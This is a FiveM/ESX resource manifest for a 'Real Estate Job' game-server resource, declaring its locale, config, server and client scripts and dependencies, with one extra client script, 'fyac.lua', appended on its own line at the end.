resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX Real Estate Job'

version '1.0.0'

server_scripts {
	'@extendedmode/locale.lua',
	'@mysql-async/lib/MySQL.lua',
	'locales/de.lua',
	'locales/br.lua',
	'locales/en.lua',
	'locales/fi.lua',
	'locales/fr.lua',
	'locales/sv.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@extendedmode/locale.lua',
	'locales/de.lua',
	'locales/br.lua',
	'locales/en.lua',
	'locales/fi.lua',
	'locales/fr.lua',
	'locales/sv.lua',
	'config.lua',
	'client/main.lua'
}

dependencies {
	'extendedmode',
	-- 'esx_property',
	'esx_addonaccount',
	'esx_society'
}
client_script 'fyac.lua'